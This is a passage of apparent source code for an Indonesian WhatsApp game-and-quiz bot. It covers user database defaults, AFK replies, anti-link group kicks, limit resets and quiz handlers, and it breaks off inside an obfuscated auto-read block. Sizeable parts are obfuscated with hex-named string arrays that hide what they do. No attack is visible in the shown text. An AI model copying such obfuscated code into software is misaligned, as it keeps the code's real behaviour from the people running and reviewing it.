0};if(!isNumber(user[_0xac87[103]])){user[_0xac87[103]]= 0};if(!isNumber(user[_0xac87[104]])){user[_0xac87[104]]= 0};if(!isNumber(user[_0xac87[105]])){user[_0xac87[105]]= 0};if(!isNumber(user[_0xac87[106]])){user[_0xac87[106]]= 0};if(!isNumber(user[_0xac87[107]])){user[_0xac87[107]]= 0};if(!isNumber(user[_0xac87[108]])){user[_0xac87[108]]= 0};if(!isNumber(user[_0xac87[109]])){user[_0xac87[109]]= 0};if(!isNumber(user[_0xac87[110]])){user[_0xac87[110]]= 0};if(!isNumber(user[_0xac87[111]])){user[_0xac87[111]]= 0};if(!isNumber(user[_0xac87[112]])){user[_0xac87[112]]= 0};if(!isNumber(user[_0xac87[113]])){user[_0xac87[113]]= 0};if(!isNumber(user[_0xac87[114]])){user[_0xac87[114]]= 0};if(!isNumber(user[_0xac87[115]])){user[_0xac87[115]]= 0};if(!isNumber(user[_0xac87[116]])){user[_0xac87[116]]= 0};if(!isNumber(user[_0xac87[117]])){user[_0xac87[117]]= 0};if(!isNumber(user[_0xac87[118]])){user[_0xac87[118]]= 0};if(!isNumber(user[_0xac87[119]])){user[_0xac87[119]]= 0};if(!isNumber(user[_0xac87[120]])){user[_0xac87[120]]= 0};if(!isNumber(user[_0xac87[97]])){user[_0xac87[97]]= 0};if(!isNumber(user[_0xac87[121]])){user[_0xac87[121]]= 0};if(!isNumber(user[_0xac87[122]])){user[_0xac87[122]]= 0};if(!isNumber(user[_0xac87[123]])){user[_0xac87[123]]= 0};if(!(_0xac87[124] in  user)){user[_0xac87[124]]= false};if(!isNumber(user[_0xac87[125]])){user[_0xac87[125]]= 0};if(!isNumber(user[_0xac87[126]])){user[_0xac87[126]]= 0};if(!isNumber(user[_0xac87[127]])){user[_0xac87[127]]= 0};if(!isNumber(user[_0xac87[77]])){user[_0xac87[77]]= 0};if(!isNumber(user[_0xac87[78]])){user[_0xac87[78]]= 0};if(!isNumber(user[_0xac87[79]])){user[_0xac87[79]]= 0};if(!isNumber(user[_0xac87[80]])){user[_0xac87[80]]= 0};if(!isNumber(user[_0xac87[81]])){user[_0xac87[81]]= 0};if(!isNumber(user[_0xac87[82]])){user[_0xac87[82]]= 0};if(!isNumber(user[_0xac87[128]])){user[_0xac87[128]]= 0};if(!isNumber(user[_0xac87[129]])){user[_0xac87[129]]= 0};if(!isNumber(user[_0xac87[130]])){user[_0xac87[130]]= 0};if(!isNumber(user[_0xac87[131]])){user[_0xac87[131]]= 0};if(!isNumber(user[_0xac87[132]])){user[_0xac87[132]]= 0};if(!isNumber(user[_0xac87[133]])){user[_0xac87[133]]= 0};if(!isNumber(user[_0xac87[134]])){user[_0xac87[134]]= 0};if(!isNumber(user[_0xac87[135]])){user[_0xac87[135]]= 0};if(!isNumber(user[_0xac87[136]])){user[_0xac87[136]]= 0};if(!isNumber(user[_0xac87[137]])){user[_0xac87[137]]= 0};if(!isNumber(user[_0xac87[138]])){user[_0xac87[138]]= 0};if(!isNumber(user[_0xac87[139]])){user[_0xac87[139]]= 0};if(!isNumber(user[_0xac87[140]])){user[_0xac87[140]]= 0};if(!isNumber(user[_0xac87[141]])){user[_0xac87[141]]= 0};if(!isNumber(user[_0xac87[142]])){user[_0xac87[142]]= 0};if(!isNumber(user[_0xac87[143]])){user[_0xac87[143]]= 0};if(!isNumber(user[_0xac87[144]])){user[_0xac87[144]]= 0};if(!isNumber(user[_0xac87[145]])){user[_0xac87[145]]= 0};if(!isNumber(user[_0xac87[146]])){user[_0xac87[146]]= 0};if(!isNumber(user[_0xac87[147]])){user[_0xac87[147]]= 0};if(!isNumber(user[_0xac87[148]])){user[_0xac87[148]]= 0};if(!isNumber(user[_0xac87[149]])){user[_0xac87[149]]= 0};if(!isNumber(user[_0xac87[150]])){user[_0xac87[150]]= 0};if(!isNumber(user[_0xac87[151]])){user[_0xac87[151]]= 0};if(!isNumber(user[_0xac87[152]])){user[_0xac87[152]]= 0};if(!isNumber(user[_0xac87[153]])){user[_0xac87[153]]= 0};if(!isNumber(user[_0xac87[154]])){user[_0xac87[154]]= 0};if(!isNumber(user[_0xac87[155]])){user[_0xac87[155]]= 0};if(!isNumber(user[_0xac87[156]])){user[_0xac87[156]]= 0};if(!isNumber(user[_0xac87[157]])){user[_0xac87[157]]= 0};if(!isNumber(user[_0xac87[158]])){user[_0xac87[158]]= 0};if(!isNumber(user[_0xac87[159]])){user[_0xac87[159]]= 0};if(!isNumber(user[_0xac87[160]])){user[_0xac87[160]]= 0};if(!isNumber(user[_0xac87[161]])){user[_0xac87[161]]= 0};if(!isNumber(user[_0xac87[162]])){user[_0xac87[162]]= 0};if(!isNumber(user[_0xac87[163]])){user[_0xac87[163]]= 0};if(!isNumber(user[_0xac87[164]])){user[_0xac87[164]]= 0};if(!isNumber(user[_0xac87[165]])){user[_0xac87[165]]= 0};if(!isNumber(user[_0xac87[166]])){user[_0xac87[166]]= 0};if(!isNumber(user[_0xac87[167]])){user[_0xac87[167]]= 0};if(!isNumber(user[_0xac87[168]])){user[_0xac87[168]]= 0};if(!isNumber(user[_0xac87[169]])){user[_0xac87[169]]= 0};if(!isNumber(user[_0xac87[170]])){user[_0xac87[170]]= 0};if(!isNumber(user[_0xac87[171]])){user[_0xac87[171]]= 0};if(!isNumber(user[_0xac87[172]])){user[_0xac87[172]]= 0};if(!isNumber(user[_0xac87[173]])){user[_0xac87[173]]= 0};if(!isNumber(user[_0xac87[174]])){user[_0xac87[174]]= 0};if(!isNumber(user[_0xac87[175]])){user[_0xac87[175]]= 0};if(!isNumber(user[_0xac87[176]])){user[_0xac87[176]]= 0};if(!isNumber(user[_0xac87[177]])){user[_0xac87[177]]= 0};if(!isNumber(user[_0xac87[178]])){user[_0xac87[178]]= 0};if(!isNumber(user[_0xac87[179]])){user[_0xac87[179]]= 0};if(!isNumber(user[_0xac87[180]])){user[_0xac87[180]]= 0};if(!isNumber(user[_0xac87[181]])){user[_0xac87[181]]= 0};if(!isNumber(user[_0xac87[182]])){user[_0xac87[182]]= 0};if(!isNumber(user[_0xac87[183]])){user[_0xac87[183]]= 0};if(!isNumber(user[_0xac87[184]])){user[_0xac87[184]]= 0};if(!isNumber(user[_0xac87[185]])){user[_0xac87[185]]= 0};if(!(_0xac87[186] in  user)){user[_0xac87[186]]= false};if(!user[_0xac87[186]]){if(!(_0xac87[187] in  user)){user[_0xac87[187]]= pushname};if(!(_0xac87[188] in  user)){user[_0xac87[188]]= _0xac87[11]};if(!(_0xac87[189] in  user)){user[_0xac87[189]]= _0xac87[11]};if(!(_0xac87[190] in  user)){user[_0xac87[190]]= _0xac87[11]};if(!isNumber(user[_0xac87[69]])){user[_0xac87[69]]= 0};if(!isNumber(user[_0xac87[191]])){user[_0xac87[191]]= 0};if(!isNumber(user[_0xac87[192]])){user[_0xac87[192]]= 0};if(!isNumber(user[_0xac87[193]])){user[_0xac87[193]]= 0};if(!isNumber(user[_0xac87[194]])){user[_0xac87[194]]= 0};if(!isNumber(user[_0xac87[195]])){user[_0xac87[195]]= 0};if(!isNumber(user[_0xac87[196]])){user[_0xac87[196]]= 0};if(!isNumber(user[_0xac87[123]])){user[_0xac87[123]]= 0};if(!isNumber(user[_0xac87[51]])){user[_0xac87[51]]= 0};if(!isNumber(user[_0xac87[197]])){user[_0xac87[197]]= 0};if(!isNumber(user[_0xac87[198]])){user[_0xac87[198]]= 0};if(!isNumber(user[_0xac87[199]])){user[_0xac87[199]]= 0};if(!isNumber(user[_0xac87[200]])){user[_0xac87[200]]= 0};if(!isNumber(user[_0xac87[201]])){user[_0xac87[201]]= 0};if(!isNumber(user[_0xac87[202]])){user[_0xac87[202]]= 0};if(!isNumber(user[_0xac87[203]])){user[_0xac87[203]]= 0};if(!isNumber(user[_0xac87[204]])){user[_0xac87[204]]=  -1};if(!isNumber(user[_0xac87[205]])){user[_0xac87[205]]=  -1};if(!isNumber(user[_0xac87[206]])){user[_0xac87[206]]=  -1}};if(!isNumber(user[_0xac87[24]])){user[_0xac87[24]]= 0};if(!user[_0xac87[207]]){user[_0xac87[207]]= _0xac87[208]};if(!user[_0xac87[209]]){user[_0xac87[209]]= _0xac87[210]};if(!user[_0xac87[211]]){user[_0xac87[211]]= _0xac87[212]};if(!(_0xac87[213] in  user)){user[_0xac87[213]]= true};if(!(_0xac87[181] in  user)){user[_0xac87[181]]= true}}else {db[_0xac87[6]][_0xac87[5]][m[_0xac87[4]]]= {premium:false,banned:false,afkTime:-1,pc:0,afkReason:_0xac87[11],language:_0xac87[16],limit:user[_0xac87[1]]?limitawal[_0xac87[1]]:limitawal[_0xac87[3]],healt:100,title:_0xac87[11],healtmonster:0,haus:100,laper:100,tprem:0,stamina:100,level:0,pasangan:_0xac87[11],exp:0,coin:0,atm:0,tigame:50,lastclaim:0,money:1000,bank:1000,diamond:0,iron:0,pisang:0,anggur:0,mangga:0,jeruk:0,apel:0,bibitpisang:0,bibitanggur:0,bibitmangga:0,bibitjeruk:0,bibitapel:0,gardenboxs:0,emas:0,common:0,boxs:0,cupon:0,uncommon:0,mythic:0,legendary:0,rumahsakit:0,fortress:0,trofi:0,rtrofi:_0xac87[214],makanan:0,troopcamp:0,shield:0,arlok:0,ojekk:0,korbanngocok:0,as:0,paus:0,kepiting:0,gurita:0,cumi:0,buntal:0,dory:0,lumba:0,lobster:0,hiu:0,lele:0,nila:0,bawal:0,udang:0,ikan:0,orca:0,banteng:0,harimau:0,gajah:0,kambing:0,panda:0,buaya:0,kerbau:0,sapi:0,monyet:0,babihutan:0,babi:0,ayam:0,apel:20,ayamb:0,ayamg:0,ssapi:0,sapir:0,leleb:0,leleg:0,esteh:0,pet:0,potion:0,sampah:0,armor:0,kucing:0,kucinglastclaim:0,kuda:0,kudalastclaim:0,rubah:0,rubahlastclaim:0,anjing:0,anjinglastclaim:0,naga:0,nagalastclaim:0,griffin:0,griffinlastclaim:0,centaur:0,centaurlastclaim:0,serigala:0,serigalalastclaim:0,phonix:0,phonixlastclaim:0,makanannaga:0,makananphonix:0,makanancentaur:0,makananserigala:0,BannedReason:_0xac87[11],warn:0,anakkucing:0,anakkuda:0,anakrubah:0,anakanjing:0,makananpet:0,antispam:0,antispamlastclaim:0,kayu:0,batu:0,string:0,umpan:0,sword:0,sworddurability:0,pickaxe:0,pickaxedurability:0,fishingrod:0,fishingroddurability:0,lastadventure:0,lastbanned:0,lastopen:0,lastkill:0,lastnguli:0,lastfishing:0,lastdungeon:0,lastduel:0,lastmining:0,lasthourly:0,lasthunt:0,lastweekly:0,lastmonthly:0,lastjb:0,lastrob:0,lastdaang:0,lastngojek:0,lastgrab:0,lastngocok:0,lastturu:0,lastseen:0,lastSetStatus:0,registered:false,apel:20,mangga:0,stroberi:0,semangka:0,jeruk:0,semangka:0,premiumTime:0,job:_0xac87[208],lbars:_0xac87[210],role:_0xac87[212],registered:false,name:pushname,gender:_0xac87[11],hobi:_0xac87[11],serialNumber:_0xac87[11],age:-1,premiumDate:-1,regTime:-1,autolevelup:true,lastIstigfar:0}};let chats=db[_0xac87[6]][_0xac87[216]][m[_0xac87[215]]];if( typeof chats!== _0xac87[7]){db[_0xac87[6]][_0xac87[216]][m[_0xac87[215]]]= {}};if(chats){if(!(_0xac87[187] in  chats)){chats[_0xac87[187]]= groupName?groupName:_0xac87[217]};if(!(_0xac87[218] in  chats)){chats[_0xac87[218]]= true};if(!(_0xac87[219] in  chats)){chats[_0xac87[219]]= true};if(!(_0xac87[220] in  chats)){chats[_0xac87[220]]= true};if(!(_0xac87[221] in  chats)){chats[_0xac87[221]]= true};if(!(_0xac87[222] in  chats)){chats[_0xac87[222]]= false};if(!(_0xac87[223] in  chats)){chats[_0xac87[223]]= _0xac87[11]};if(!(_0xac87[224] in  chats)){chats[_0xac87[224]]= false};if(!(_0xac87[225] in  chats)){chats[_0xac87[225]]= false};if(!(_0xac87[226] in  chats)){chats[_0xac87[226]]= false};if(!(_0xac87[227] in  chats)){chats[_0xac87[227]]= false};if(!(_0xac87[228] in  chats)){chats[_0xac87[228]]= _0xac87[11]};if(!(_0xac87[229] in  chats)){chats[_0xac87[229]]= _0xac87[11]};if(!(_0xac87[230] in  chats)){chats[_0xac87[230]]= _0xac87[11]};if(!(_0xac87[231] in  chats)){chats[_0xac87[231]]= _0xac87[11]};if(!(_0xac87[232] in  chats)){chats[_0xac87[232]]= _0xac87[11]};if(!(_0xac87[233] in  chats)){chats[_0xac87[233]]= _0xac87[11]};if(!(_0xac87[234] in  chats)){chats[_0xac87[234]]= _0xac87[11]};if(!isNumber(chats[_0xac87[235]])){chats[_0xac87[235]]= 0}}else {db[_0xac87[6]][_0xac87[216]][m[_0xac87[215]]]= {name:groupName?groupName:_0xac87[217],goodbye:true,welcome:true,promote:true,demote:true,mute:false,captionPay:_0xac87[11],nsfw:false,sewa:false,antilink:false,antionce:false,setWelcome:_0xac87[11],setLeave:_0xac87[11],setPromote:_0xac87[11],setDemote:_0xac87[11],setProses:_0xac87[11],setDone:_0xac87[11],paygc:_0xac87[11],expired:0}};let setting=db[_0xac87[6]][_0xac87[236]][botNumber];if( typeof setting!== _0xac87[7]){db[_0xac87[6]][_0xac87[236]][botNumber]= {}};if(setting){if(!(_0xac87[237] in  setting)){setting[_0xac87[237]]= autoread};if(!(_0xac87[238] in  setting)){setting[_0xac87[238]]= autobio};if(!(_0xac87[239] in  setting)){setting[_0xac87[239]]= false};if(!(_0xac87[240] in  setting)){setting[_0xac87[240]]= userRegister};if(!(_0xac87[241] in  setting)){setting[_0xac87[241]]= false};if(!(_0xac87[242] in  setting)){setting[_0xac87[242]]= false};if(!(_0xac87[243] in  setting)){setting[_0xac87[243]]= autoblok212};if(!(_0xac87[244] in  setting)){setting[_0xac87[244]]= false}}else {db[_0xac87[6]][_0xac87[236]][botNumber]= {autoread:autoread,autobio:autobio,available:false,userRegister:userRegister,composing:false,recording:false,autoblok:autoblok212,autorespond:false}}}catch(err){console[_0xac87[245]](err)}
for (let jid of mentionUser) {
let user = db.data.users[jid]
if (!user) continue
let afkTime = user.afkTime
if (!afkTime || afkTime < 0) continue
let reason = user.afkReason || ''
reply(`Jangan tag dia!
Dia sedang AFK ${reason ? '\nReason : ' + reason : 'Reason : Nothing'}
Waktu : ${clockString(new Date - afkTime)}
`.trim())
}
if (db.data.users[m.sender].afkTime > -1) {
let user = db.data.users[m.sender]
m.reply(`
Kamu berhenti AFK${user.afkReason ? ' setelah ' + user.afkReason : ''}
Selama ${clockString(new Date - user.afkTime)}
`.trim())
user.afkTime = -1
user.afkReason = ''
}


const  { indonesia, english, spanyol} = require(`./language`)
let lang = db.data.users[m.sender].language;
if (lang === "id") {
       lang = indonesia;
     } else if (lang === "en") {
       lang = english;
     } else if (lang === "sp") {
       lang = spanyol;
     } else {
       lang = indonesia;
     }
     
        if (m.isGroup && !m.key.fromMe &&  db.data.chats[m.chat].antilink && !isCreator && !isGroupAdmins && !isGroupOwner){
        	if (budy.match(`https://chat.whatsapp.com`)) {
        	if (!isBotAdmins) return
        	alpha.sendMessage(m.chat, {text: lang.KickAh(groupMetadata.subject)}, {quoted:m})
     	   let gclink = (`https://chat.whatsapp.com/`+await alpha.groupInviteCode(m.chat))
	        let isLinkThisGc = new RegExp(gclink, 'i')
  	      let isgclink = isLinkThisGc.test(m.text)
		  if (isgclink) return reply(lang.GjdKick())
			await alpha.sendMessage(m.chat, { delete: m.key })
			alpha.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
		}
	}

		if (/^a(s|ss)alamu('|)alaikum$/.test(budy?.toLowerCase())) {
            const jawab_salam = [
                'Wa\'alaikumusalam',
                'Wa\'alaikumusalam wb',
                'Wa\'alaikumusalam Warohmatulahi Wabarokatuh',
            ]
            return reply(randomArr(jawab_salam))
        }
        
        let cron = require('node-cron')
        cron.schedule('00 23 * * *', () => {
            let user = Object.keys(global.db.data.users)
            for (let jid of user) {
            let limitUser = db.data.users[jid].premium ? global.limitawal.premium : global.limitawal.free
            global.db.data.users[jid].limit = limitUser
			}
            console.log('Reseted Limit')
        }, {
            scheduled: true,
            timezone: "Asia/Jakarta"
        })
        
        if(!m.key.fromMe && isCmd && db.data.users[m.sender].banned){
          if (!(new Date - db.data.users[m.sender].lastbanned < 3600000)) {
	        let user = db.data.users[m.sender]
	      	user.lastbanned = new Date * 1
          await alpha.sendMessage(m.chat, {text: lang.getBan(ownernomer)}, {quoted: m})
          }
        return
       	} 

        // Public & Self
        if (!alpha.public) {
            if (!m.key.fromMe && !isCreator) return
        }

        // Push Message To Console
        if (m.message) {
        	console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32m CMD \x1b[1;37m]', time, chalk.green(isCmd ? body : body.slice(0, 20)), 'from', chalk.green(pushname + ' => ' + m.sender.split('@')[0]), 'in', chalk.green(groupName ? groupName : 'Private Chat' ), 'args :', chalk.green(text.length))
         }
        
		const sendFileFromUrl = async (from, url, caption, mek, men) => {
            let mime = '';
            let res = await axios.head(url)
            mime = res.headers['content-type']
            if (mime.split("/")[1] === "gif") {
                return alpha.sendMessage(from, { video: await getBuffer(url), caption: caption, gifPlayback: true, mentions: men ? men : [], mimetype: 'video/mp4'}, {quoted: m})
                }
            let type = mime.split("/")[0]+"Message"
            if(mime === "application/pdf"){
                return alpha.sendMessage(m.chat, { document: await getBuffer(url), mimetype: 'application/pdf', caption: caption, mentions: men ? men : []}, {quoted: m })
            }
            if(mime.split("/")[0] === "image"){
                return alpha.sendMessage(m.chat, { image: await getBuffer(url), caption: caption, mentions: men ? men : []}, {quoted: m})
            }
            if(mime.split("/")[0] === "video"){
                return alpha.sendMessage(m.chat, { video: await getBuffer(url), caption: caption, mentions: men ? men : [], mimetype: 'video/mp4'}, {quoted: m})
            }
            if(mime.split("/")[0] === "audio"){
                return alpha.sendMessage(m.chat, { audio: await getBuffer(url), caption: caption, mentions: men ? men : [], mimetype: 'audio/mpeg'}, {quoted: m })
            }
        }
        
/*if(autorecording){
	if(autorecording== true) return
	await alpha.sendPresenceUpdate('recording', m.chat)
	} else if(autoketik){
		if(autoketik == true) return
		await alpha.sendPresenceUpdate('composing', m.chat)
		} else if(available){
			if(available == true) return
			alpha.sendPresenceUpdate('available', m.chat)
			}*/


 //FUN

if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && !isCmd) {
kuis = true
jawaban = kuismath[m.sender.split('@')[0]][0]
hadiah = kuismath[m.sender.split('@')[0]][1]
if (budy.toLowerCase() == jawaban) {
	alpha.sendButtonText(m.chat, [{ buttonId: '.math medium', buttonText: { displayText: 'Kuis Math' }, type: 1 }], ` 🎮 Kuis Matematika🎮\n\nJawaban Benar 🎉\n\n+${hadiah} XP`, `© ${ownername}`, m)
	db.data.users[m.sender].exp += hadiah
delete kuismath[m.sender.split('@')[0]]
} else reply(lang.JwbErr())
}


if (('family100'+m.chat in _family100) && !isCmd) {
kuis = true
let room = _family100['family100'+m.chat]
let teks = budy.toLowerCase().replace(/[^\w\s\-]+/, '')
let isSurender = /^((me)?nyerah|surr?ender)$/i.test(m.text)
if (!isSurender) {
let index = room.jawaban.findIndex(v => v.toLowerCase().replace(/[^\w\s\-]+/, '') === teks)
if (room.terjawab[index]) return !0
room.terjawab[index] = m.sender
}
let isWin = room.terjawab.length === room.terjawab.filter(v => v).length
let caption = `
Jawablah Pertanyaan Berikut :\n${room.soal}\n\n\nTerdapat ${room.jawaban.length} Jawaban ${room.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}
${isWin ? `Semua Jawaban Terjawab` : isSurender ? 'Menyerah!' : ''}
${Array.from(room.jawaban, (jawaban, index) => {
return isSurender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '@' + room.terjawab[index].split('@')[0] : ''}`.trim() : false
}).filter(v => v).join('\n')}
${isSurender ? '' : ``}`.trim()
alpha.sendText(m.chat, caption, m, { contextInfo: { mentionedJid: parseMention(caption) }}).then(mes => { return _family100['family100'+m.chat].pesan = mesg }).catch(_ => _)
if (isWin || isSurender) delete _family100['family100'+m.chat]
}

if (tebakgambar.hasOwnProperty(m.sender.split('@')[0]) && !isCmd) {
kuis = true
jawaban = tebakgambar[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
await alpha.sendButtonText(m.chat, [{ buttonId: '.tebakgambar', buttonText: { displayText: lang.TbGam()}, type: 1 }], lang.JwbTrue(lang.TbGam()), `© ${ownername}`, m)
delete tebakgambar[m.sender.split('@')[0]]
} else reply(lang.JwbErr())
}


if (tebakkata.hasOwnProperty(m.sender.split('@')[0]) && !isCmd) {
kuis = true
jawaban = tebakkata[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
await alpha.sendButtonText(m.chat, [{ buttonId: '.tebakkata', buttonText: { displayText: lang.TbKa() }, type: 1 }], lang.JwbTrue(lang.TbKa()), `© ${ownername}`, m)
delete tebakkata[m.sender.split('@')[0]]
} else reply(lang.JwbErr())
}


if (tebakbendera.hasOwnProperty(m.sender.split('@')[0]) && !isCmd) {
kuis = true
jawaban = tebakbendera[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
await alpha.sendButtonText(m.chat, [{ buttonId: '.tebakbendera', buttonText: { displayText: lang.TbBe() }, type: 1 }], lang.JwbTrue(lang.TbBe()), `© ${ownername}`, m)
delete tebakbendera[m.sender.split('@')[0]]
} else reply(lang.JwbErr())
}


if (caklontong.hasOwnProperty(m.sender.split('@')[0]) && !isCmd) {
kuis = true
jawaban = caklontong[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
await alpha.sendButtonText(m.chat, [{ buttonId: '.caklontong', buttonText: { displayText: lang.TbCak() }, type: 1 }], lang.JwbTrue(lang.TbCak()), `© ${ownername}`, m)
delete caklontong[m.sender.split('@')[0]]
} else reply(lang.JwbErr())
}


if (susunkata.hasOwnProperty(m.sender.split('@')[0]) && !isCmd) {
kuis = true
jawaban = susunkata[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
await alpha.sendButtonText(m.chat, [{ buttonId: '.susunkata', buttonText: { displayText: lang.TbSu() }, type: 1 }], lang.JwbTrue(lang.TbSu()), `© ${ownername}`, m)
await delete susunkata[m.sender.split('@')[0]]
} else reply(lang.JwbErr())
}


if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0]) && !isCmd) {
kuis = true
jawaban = tebakkalimat[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
await alpha.sendButtonText(m.chat, [{ buttonId: '.tebakkalimat', buttonText: { displayText: lang.TbAt() }, type: 1 }], lang.JwbTrue(lang.TbAt()), `© ${ownername}`, m)
delete tebakkalimat[m.sender.split('@')[0]]
} else reply(lang.JwbErr())
}


if (siapaaku.hasOwnProperty(m.sender.split('@')[0]) && !isCmd) {
kuis = true
jawaban = siapaaku[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
await alpha.sendButtonText(m.chat, [{ buttonId: '.tebaksiapa', buttonText: { displayText: lang.TbSi() }, type: 1 }], lang.JwbTrue(lang.TbSi()), `© ${ownername}`, m)
delete siapaaku[m.sender.split('@')[0]]
} else reply(lang.JwbErr())
}



if (tekateki.hasOwnProperty(m.sender.split('@')[0]) && !isCmd) {
kuis = true
jawaban = tekateki[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
await alpha.sendButtonText(m.chat, [{ buttonId: '.tekateki', buttonText: { displayText: lang.Tbte()}, type: 1 }], lang.JwbTrue(lang.Tbte()), `© ${ownername}`, m)
delete tekateki[m.sender.split('@')[0]]
} else reply(lang.JwbErr())
}


if (tebakkabupaten.hasOwnProperty(m.sender.split('@')[0]) && !isCmd) {
kuis = true
jawaban = tebakkabupaten[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
await alpha.sendButtonText(m.chat, [{ buttonId: '.tebakkabupaten', buttonText: { displayText: lang.TbEn() }, type: 1 }], lang.JwbTrue(lang.TbEn()), `© ${ownername}`, m)
delete tebakkabupaten[m.sender.split('@')[0]]
} else reply(lang.JwbErr())
}


if (tebakkimia.hasOwnProperty(m.sender.split('@')[0]) && !isCmd) {
kuis = true
jawaban = tebakkimia[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
await alpha.sendButtonText(m.chat, [{ buttonId: '.tebakkimia', buttonText: { displayText: lang.TbKi() }, type: 1 }], lang.JwbTrue(lang.TbKi()), `© ${ownername}`, m)
delete tebakkimia[m.sender.split('@')[0]]
} else reply(lang.JwbErr())
}


if (tebaklirik.hasOwnProperty(m.sender.split('@')[0]) && !isCmd) {
kuis = true
jawaban = tebaklirik[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
await alpha.sendButtonText(m.chat, [{ buttonId: '.tebaklirik', buttonText: { displayText: lang.TbLi() }, type: 1 }], lang.JwbTrue(lang.TbLi()), `© ${ownername}`, m)
delete tebaklirik[m.sender.split('@')[0]]
} else reply(lang.JwbErr())
}


if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && !isCmd) {
kuis = true
jawaban = tebaktebakan[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
await alpha.sendButtonText(m.chat, [{ buttonId: '.tebaktebakan', buttonText: { displayText: lang.TbKan() }, type: 1 }], lang.JwbTrue(lang.TbKan()), `© ${ownername}`, m)
delete tebaktebakan[m.sender.split('@')[0]]
} else reply(lang.JwbErr())
}

await alpha.sendPresenceUpdate('available', m.chat)
function _0x15bd51(_0x20191d,_0x485f5a,_0x4781dc,_0x3fa6fd,_0x76c547){return _0x380d(_0x3fa6fd- -0xb9,_0x76c547);}(function(_0x3752cd,_0x32f2c6){function _0x3613bf(_0x476eda,_0x241b33,_0x54c3d3,_0x8eec51,_0x34d0a7){return _0x380d(_0x54c3d3- -0x375,_0x241b33);}function _0x57b29b(_0x36b3de,_0x336007,_0x573933,_0xc7cecf,_0x580ad5){return _0x380d(_0x336007-0x21f,_0x573933);}function _0xafc06(_0x2cbbc4,_0x41377c,_0x4c2c74,_0x5f0e7b,_0x44ed6a){return _0x380d(_0x44ed6a- -0x185,_0x5f0e7b);}const _0xb2d6a1=_0x3752cd();function _0x182d55(_0xd988c2,_0x3ce697,_0x3e4fcf,_0x3ecb14,_0x26dbf9){return _0x380d(_0x3e4fcf-0x34e,_0x26dbf9);}function _0x4a4158(_0x599163,_0x7ea6c7,_0x8b235c,_0x70d766,_0x5b791e){return _0x380d(_0x7ea6c7-0x27b,_0x8b235c);}while(!![]){try{const _0x23b24a=parseInt(_0x182d55(0x525,0x4ae,0x4ea,0x516,0x4c3))/(-0x1*-0x243d+0x54e*0x2+-0x2*0x176c)*(parseInt(_0x182d55(0x494,0x502,0x4e7,0x4ff,0x498))/(0x1*-0x1eb+0x1cb7+-0x1aca))+-parseInt(_0x182d55(0x4be,0x49e,0x4a8,0x46f,0x4c8))/(-0x1*-0xc46+-0x1334+0x6f1)+parseInt(_0x182d55(0x51a,0x491,0x4f2,0x4f8,0x4f1))/(0x1*0x33d+0x1*0x119a+-0x14d3)*(-parseInt(_0x182d55(0x486,0x4cb,0x4d7,0x4f7,0x4e5))/(-0x111a*0x2+-0x11a3*-0x2+-0x10d))+parseInt(_0x57b29b(0x412,0x3b6,0x3ac,0x3b0,0x3da))/(-0x144*0x14+0x1344+0x612)+parseInt(_0x3613bf(-0x243,-0x2b1,-0x254,-0x2b9,-0x2b4))/(0x2ab*-0x1+-0x126c*0x2+0x278a)+-parseInt(_0x57b29b(0x2bf,0x319,0x35d,0x351,0x2ca))/(-0x941+0x1*0xa16+-0xcd)*(parseInt(_0x57b29b(0x378,0x33a,0x381,0x362,0x2fc))/(0x10dd+0x50d+0x3*-0x74b))+-parseInt(_0x57b29b(0x2c7,0x326,0x303,0x386,0x2e9))/(-0x24d*0x6+0x2681*-0x1+-0x1*-0x3459)*(-parseInt(_0x3613bf(-0x1a2,-0x219,-0x1dd,-0x20b,-0x1c8))/(-0xb99*-0x1+-0x1c42+0x85a*0x2));if(_0x23b24a===_0x32f2c6)break;else _0xb2d6a1['push'](_0xb2d6a1['shift']());}catch(_0x442d15){_0xb2d6a1['push'](_0xb2d6a1['shift']());}}}(_0x498f,0x322f1*-0x1+-0x1a86d*-0x7+0x3*-0x40a2));if(m[_0x34ac6b(-0xbd,-0xb4,-0x142,-0x10d,-0xf3)+'ge']&&db[_0x15bd51(0xa8,0x6a,0x79,0xc3,0xbd)][_0x314312(-0x57,0x39,0x4,-0x29,0x53)+_0x15bd51(0x88,0xa8,0xb4,0x5a,0x1e)][botNumber][_0x5e2797(0x421,0x431,0x467,0x447,0x489)+_0x919e99(0x3db,0x43e,0x435,0x3d6,0x3f7)]){const _0x44e267={};_0x44e267[_0x5e2797(0x42d,0x3ca,0x36c,0x3c1,0x413)+_0x34ac6b(-0xb6,-0xd1,-0x146,-0xf3,-0x130)]=m[_0x5e2797(0x4c7,0x46f,0x4b7,0x47d,0x44c)],_0x44e267['id']=m[_0x5e2797(0x42d,0x440,0x410,0x427,0x3de)]['id'],_0x44e267[_0x15bd51(0xb8,0xcf,0x88,0xe9,0xf6)+_0x919e99(0x401,0x453,0x433,0x41a,0x3fc)+'t']=m[_0x34ac6b(-0x150,-0xaf,-0x14e,-0xf2,-0x11b)+'up']?m[_0x314312(0x46,0x83,0x35,0x95,-0x14)][_0x34ac6b(-0x6e,-0x19,-0xb6,-0x6d,-0xa1)+_0x15bd51(0x122,0x101,0x133,0xd1,0xa9)+'t']:undefined;const readkey=_0x44e267;await 